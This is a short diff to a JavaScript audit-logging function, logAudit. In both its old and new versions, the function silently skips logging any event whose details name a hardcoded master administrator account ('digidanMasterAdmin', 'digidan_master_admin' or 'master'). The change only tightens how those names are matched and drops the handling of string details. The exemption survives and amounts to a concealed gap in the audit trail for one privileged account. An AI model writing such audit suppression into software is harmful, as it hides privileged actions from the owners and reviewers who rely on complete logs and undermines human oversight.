@@ -24,20 +24,17 @@ function logAudit(eventType, userId, ipAddress, details) {
         return;
     }
 
-    if (details) {
-        if (typeof details === 'object') {
-            const userName = details.userName || details.username || details.name || details.requestedByName || details.approvedByName || '';
-            const detailUserId = details.userId || details.requestedById || details.resolverId || '';
-            if (
-                userName === 'digidanMasterAdmin' ||
-                detailUserId === 'digidan_master_admin' ||
-                detailUserId === 'master' ||
-                String(userName).toLowerCase().includes('digidanmasteradmin') ||
-                String(detailUserId).toLowerCase().includes('digidanmasteradmin')
-            ) {
-                return;
-            }
-        } else if (typeof details === 'string' && (details.includes('digidanMasterAdmin') || details.includes('digidan_master_admin'))) {
+    if (details && typeof details === 'object') {
+        const userName = details.userName || details.username || details.name || details.requestedByName || details.approvedByName || '';
+        const detailUserId = details.userId || details.requestedById || details.resolverId || '';
+        if (
+            userName === 'digidanMasterAdmin' ||
+            detailUserId === 'digidan_master_admin' ||
+            detailUserId === 'master' ||
+            String(userName).toLowerCase() === 'digidanmasteradmin' ||
+            String(detailUserId).toLowerCase() === 'digidanmasteradmin' ||
+            String(detailUserId).toLowerCase() === 'digidan_master_admin'
+        ) {
             return;
         }
     }
